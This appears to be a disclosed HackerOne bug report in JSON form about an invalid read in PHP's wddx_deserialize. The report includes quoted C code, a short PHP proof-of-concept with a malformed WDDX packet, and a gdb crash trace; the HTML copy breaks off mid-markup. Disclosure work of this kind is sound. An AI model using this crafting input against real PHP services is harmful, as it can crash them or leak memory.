{"id":188661,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODg2NjE=","url":"https://hackerone.com/reports/188661","title":"Invalid read when wddx decodes empty boolean element","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-12-06T09:01:56.225Z","submitted_at":"2016-12-06T09:01:56.225Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fosec","url":"/fosec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:20:07.865Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:20:06.268Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n-----------\nI have found some vulnerable code in wddx extension. The trouble happens when trying to process 'boolean' tag. If I open \u003cboolean\u003e tag without data, new st_entry item WILL NOT be pushed into stack. When \u003cboolean\u003e tag is closed and stack-\u003etop is greater than 1, st_entry item at top of stack WILL be popped out of stack.\n\nLook at following snip code, a new st_entry will be pushed into stack if atts is not NULL. If I open \u003cboolean\u003e tag by using '\u003cboolean/\u003e', 'atts' is NULL.\n\n``` c\nstatic void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)\n{\n\t.....\n\t} else if (!strcmp((char *)name, EL_BOOLEAN)) {\n\t\tint i;\n\n\t\tif (atts) for (i = 0; atts[i]; i++) {\n\t\t\tif (!strcmp((char *)atts[i], EL_VALUE) \u0026\u0026 atts[i+1] \u0026\u0026 atts[i+1][0]) {\n\t\t\t\tent.type = ST_BOOLEAN;\n\t\t\t\tSET_STACK_VARNAME;\n\n\t\t\t\tZVAL_TRUE(\u0026ent.data);\n\t\t\t\twddx_stack_push((wddx_stack *)stack, \u0026ent, sizeof(st_entry));\n\t\t\t\tphp_wddx_process_data(user_data, atts[i+1], strlen((char *)atts[i+1]));\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t} \n    .....\n}\n```\n\nLook at the other snip code, I see \"boolean\" tag is popped and freed without checking anything:\n\n``` c\nstatic void php_wddx_pop_element(void *user_data, const XML_Char *name)\n{\n\tst_entry \t\t\t*ent1, *ent2;\n\twddx_stack \t\t\t*stack = (wddx_stack *)user_data;\n\n\n\tif (!strcmp((char *)name, EL_STRING) || !strcmp((char *)name, EL_NUMBER) ||\n\t\t!strcmp((char *)name, EL_BOOLEAN) || !strcmp((char *)name, EL_NULL) ||\n\t  \t!strcmp((char *)name, EL_ARRAY) || !strcmp((char *)name, EL_STRUCT) ||\n\t\t!strcmp((char *)name, EL_RECORDSET) || !strcmp((char *)name, EL_BINARY) ||\n\t\t!strcmp((char *)name, EL_DATETIME)) {\n\t\twddx_stack_top(stack, (void**)\u0026ent1);\n\t\t...\n\n\t\tif (stack-\u003etop \u003e 1) {\n\t\t\tstack-\u003etop--;\n\t\t\twddx_stack_top(stack, (void**)\u0026ent2);\n            .....\n\t\t\tefree(ent1);\n\t\t} else {\n\t\t\tstack-\u003edone = 1;\n\t\t}\n\t}\n    ....\n}\n```\n\nTest script\n-----------\n``` php\n\u003c?php\n$xml = \u003c\u003c\u003cEOF\n\u003c?xml version=\"1.0\" ?\u003e\n\u003cwddxPacket version=\"1.0\"\u003e\n\u003cnumber\u003e2261634.5098039215\u003c/number\u003e\n\u003cbinary\u003e\u003cboolean/\u003e\u003c/binary\u003e\n\u003c/wddxPacket\u003e\nEOF;\n$wddx = wddx_deserialize($xml);\nvar_dump($wddx);\n?\u003e\n```\n\nWhen processing `binary` tag, a `st_entry` which describes `binary` tag is pushed to stack. `\u003cboolean/\u003e` will lead to `st_entry` of `binary` tag is popped out. When processing `\u003c/binary\u003e`, `php_wddx_pop_element()` function is called. `php_wddx_pop_element` will take top of stack and use it as a string object, try to decode it. We can use this issue to read anything at anywhere. If this value is not a valid memory address, it will lead to memory corruption.\n\nBelow backtrace of gdb will give you details.\n\n```\n[-------------------------------------code-------------------------------------]\n   0x82cf418 \u003cphp_wddx_pop_element+440\u003e:        mov    eax,DWORD PTR [ebx]\n=\u003e 0x82cf41a \u003cphp_wddx_pop_element+442\u003e:        mov    edx,DWORD PTR [eax+0xc]\n   0x82cf41d \u003cphp_wddx_pop_element+445\u003e:        add    eax,0x10\n   0x82cf420 \u003cphp_wddx_pop_element+448\u003e:        mov    DWORD PTR [esp],eax\n   0x82cf423 \u003cphp_wddx_pop_element+451\u003e:        mov    DWORD PTR [esp+0x4],edx\n   0x82cf427 \u003cphp_wddx_pop_element+455\u003e:        call   0x82702f0 \u003cphp_base64_decode\u003e\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbce0 --\u003e 0x89b92d4 (\"boolean\")\n0004| 0xbfffbce4 --\u003e 0xb7870080 --\u003e 0x0\n0008| 0xbfffbce8 --\u003e 0x89b8568 --\u003e 0x8931938 --\u003e 0x0\n0012| 0xbfffbcec --\u003e 0xb7c66458 (\u003c__GI___libc_malloc+8\u003e:        add    ebx,0x140ba8)\n0016| 0xbfffbcf0 --\u003e 0xb7f1e000 --\u003e 0x15adac\n0020| 0xbfffbcf4 --\u003e 0xb7d371bf (\u003c__memcpy_ssse3_rep+31\u003e:       add    ebx,0x31501)\n0024| 0xbfffbcf8 --\u003e 0xb7f1e000 --\u003e 0x15adac\n0028| 0xbfffbcfc --\u003e 0xb7e6409b (\u003cxmlStrndup__internal_alias+75\u003e:       mov    eax,edi)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\nphp_wddx_pop_element (user_data=0xbfffbf6c, name=\u003coptimized out\u003e) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905\n905                             zend_string *new_str = php_base64_decode(\ngdb-peda$ bt\n#0  php_wddx_pop_element (user_data=0xbfffbf6c, name=\u003coptimized out\u003e) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905\n#1  0x082d602b in _end_element_handler (user=0xb7870080, name=0x89b92cd \"binary\") at /root/fuzzer/PHP-7.1/ext/xml/compat.c:219\n#2  0xb7df9302 in xmlParseEndTag1 (ctxt=ctxt@entry=0x89b8568, line=line@entry=0x0) at parser.c:8796\n#3  0xb7e01c89 in xmlParseTryOrFinish (ctxt=ctxt@entry=0x89b8568, terminate=terminate@entry=0x1) at parser.c:11743\n#4  0xb7e02da3 in xmlParseChunk__internal_alias (ctxt=0x89b8568,\n    chunk=chunk@entry=0xb78661f0 \"\u003c?xml version=\\\"1.0\\\" ?\u003e\\r\\n\u003cwddxPacket version=\\\"1.0\\\"\u003e\\r\\n\u003cnumber\u003e2261634.5098039215\u003c/number\u003e\\r\\n\u003cbinary\u003e\u003cboolean/\u003e\u003c/binary\u003e\\r\\n\u003c/wddxPacket\u003e\", size=size@entry=0x83,\n    terminate=terminate@entry=0x1) at parser.c:12446\n#5  0x082d6336 in php_XML_Parse (parser=parser@entry=0xb7870080,\n    data=data@entry=0xb78661f0 \"\u003c?xml version=\\\"1.0\\\" ?\u003e\\r\\n\u003cwddxPacket version=\\\"1.0\\\"\u003e\\r\\n\u003cnumber\u003e2261634.5098039215\u003c/number\u003e\\r\\n\u003cbinary\u003e\u003cboolean/\u003e\u003c/binary\u003e\\r\\n\u003c/wddxPacket\u003e\", data_len=data_len@entry=0x83,\n    is_final=is_final@entry=0x1) at /root/fuzzer/PHP-7.1/ext/xml/compat.c:600\n#6  0x082d1904 in php_wddx_deserialize_ex (\n    value=value@entry=0xb78661f0 \"\u003c?xml version=\\\"1.0\\\" ?\u003e\\r\\n\u003cwddxPacket version=\\\"1.0\\\"\u003e\\r\\n\u003cnumber\u003e2261634.5098039215\u003c/number\u003e\\r\\n\u003cbinary\u003e\u003cboolean/\u003e\u003c/binary\u003e\\r\\n\u003c/wddxPacket\u003e\", vallen=0x83,\n    return_value=return_value@entry=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1095\n#7  0x082d1ba7 in zif_wddx_deserialize (execute_data=0xb78140b0, return_value=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1313\n#8  0x0838b6c6 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER () at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:675\n#9  0x0837c322 in execute_ex (ex=0xb7814020) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:429\n#10 0x083cb3bb in zend_execute (op_array=op_array@entry=0xb7865180, return_value=return_value@entry=0x0) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:474\n#11 0x0833bb40 in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /root/fuzzer/PHP-7.1/Zend/zend.c:1474\n#12 0x082dd0cb in php_execute_script (primary_file=primary_file@entry=0xbfffe2b8) at /root/fuzzer/PHP-7.1/main/main.c:2533\n#13 0x083cd70a in do_cli (argc=argc@entry=0x3, argv=argv@entry=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:990\n#14 0x0806d544 in main (argc=0x3, argv=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:1378\n#15 0xb7c07943 in __libc_start_main (main=0x806d070 \u003cmain\u003e, argc=0x3, ubp_av=0xbffff564, init=0x83d5260 \u003c__libc_csu_init\u003e, fini=0x83d52d0 \u003c__libc_csu_fini\u003e, rtld_fini=0xb7fee700 \u003c_dl_fini\u003e,\n    stack_end=0xbffff55c) at libc-start.c:274\n#16 0x0806d5d1 in _start ()\ngdb-peda$ i r $eax\neax            0x41414141       0x41414141\ngdb-peda$\n```","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eI have found some vulnerable code in wddx extension. The trouble happens when trying to process \u0026#39;boolean\u0026#39; tag. If I open \u0026lt;boolean\u0026gt; tag without data, new st_entry item WILL NOT be pushed into stack. When \u0026lt;boolean\u0026gt; tag is closed and stack-\u0026gt;top is greater than 1, st_entry item at top of stack WILL be popped out of stack.\u003c/p\u003e\n\n\u003cp\u003eLook at following snip code, a new st_entry will be pushed into stack if atts is not NULL. If I open \u0026lt;boolean\u0026gt; tag by using \u0026#39;\u0026lt;boolean/\u0026gt;\u0026#39;, \u0026#39;atts\u0026#39; is NULL.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003ephp_wddx_push_element\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003euser_data\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"n\"\u003eXML_Char\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"n\"\u003eXML_Char\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e.....\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"nf\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_BOOLEAN\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_VALUE\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003eent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eST_BOOLEAN\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"n\"\u003eSET_STACK_VARNAME\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n                \u003cspan class=\"n\"\u003eZVAL_TRUE\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ewddx_stack_push\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003ewddx_stack\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003estack\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eent\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003est_entry\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ephp_wddx_process_data\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euser_data\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eatts\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]));\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \n    \u003cspan class=\"p\"\u003e.....\u003c/span\u003e\n\u003cspan class=\"err\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLook at the other snip code, I see \u0026quot;boolean\u0026quot; tag is popped and freed without checking anything:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003ephp_wddx_pop_element\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003euser_data\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"n\"\u003eXML_Char\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003est_entry\u003c/span\u003e            \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eent1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eent2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ewddx_stack\u003c/span\u003e          \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003estack\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewddx_stack\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003euser_data\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_STRING\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_NUMBER\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_BOOLEAN\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_NULL\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_ARRAY\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_STRUCT\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_RECORDSET\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_BINARY\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estrcmp\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eEL_DATETIME\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ewddx_stack_top\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estack\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eent1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estack\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etop\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003estack\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etop\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ewddx_stack_top\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 